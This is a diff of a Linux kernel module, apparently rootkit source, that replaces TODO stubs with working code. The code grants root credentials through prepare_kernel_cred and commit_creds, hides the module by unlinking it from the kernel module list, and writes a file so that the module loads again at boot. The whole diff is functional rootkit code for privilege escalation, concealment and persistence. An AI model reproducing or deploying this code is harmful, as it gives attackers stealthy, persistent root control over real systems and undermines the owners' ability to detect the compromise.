@@ -6,55 +6,57 @@
 #include <linux/module.h>
 #include "rootkit.h"
 
-/*
- * TODO: Implement rk_escalate.
- *
- * prepare_kernel_cred(&init_task) + commit_creds.
- * Return -ENOMEM if prepare_kernel_cred fails.
- */
+// Privilege escalation
 int rk_escalate(void)
 {
-	return -ENOSYS;
+	struct cred *new_cred;
+
+	new_cred = prepare_kernel_cred(&init_task);
+	if (!new_cred)
+		return -ENOMEM;
+	return commit_creds(new_cred);
 }
 
-/*
- * TODO: Implement rk_cloak.
- *
- * Save THIS_MODULE->list.prev, then list_del(&THIS_MODULE->list).
- * Guard against double-cloaking.
- */
+// Module cloaking
+static struct list_head *saved_mod_list;
+
 void rk_cloak(void)
 {
+	if (saved_mod_list)
+		return;
+	saved_mod_list = THIS_MODULE->list.prev;
+	list_del(&THIS_MODULE->list);
 }
 
-/*
- * TODO: Implement rk_uncloak.
- *
- * list_add(&THIS_MODULE->list, saved_mod_list) to restore.
- * Only uncloak if currently cloaked.
- */
 void rk_uncloak(void)
 {
+	if (!saved_mod_list)
+		return;
+	list_add(&THIS_MODULE->list, saved_mod_list);
+	saved_mod_list = NULL;
 }
 
-/*
- * TODO: Implement rk_persist.
- *
- * filp_open PERSIST_PATH with O_WRONLY | O_CREAT | O_TRUNC,
- * kernel_write MODULE_NAME_STR "\n", filp_close.
- */
+// Persistence
 int rk_persist(void)
 {
-	return -ENOSYS;
+	struct file *f;
+	loff_t pos = 0;
+
+	f = filp_open(PERSIST_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+	if (IS_ERR(f))
+		return PTR_ERR(f);
+	kernel_write(f, MODULE_NAME_STR "\n", sizeof(MODULE_NAME_STR), &pos);
+	filp_close(f, NULL);
+	return 0;
 }
 
-/*
- * TODO: Implement rk_unpersist.
- *
- * filp_open PERSIST_PATH with O_WRONLY, filp_close.
- * (Truncating or removing the file disables auto-load.)
- */
 int rk_unpersist(void)
 {
-	return -ENOSYS;
+	struct file *f;
+
+	f = filp_open(PERSIST_PATH, O_WRONLY | O_TRUNC, 0);
+	if (IS_ERR(f))
+		return PTR_ERR(f);
+	filp_close(f, NULL);
+	return 0;
 }
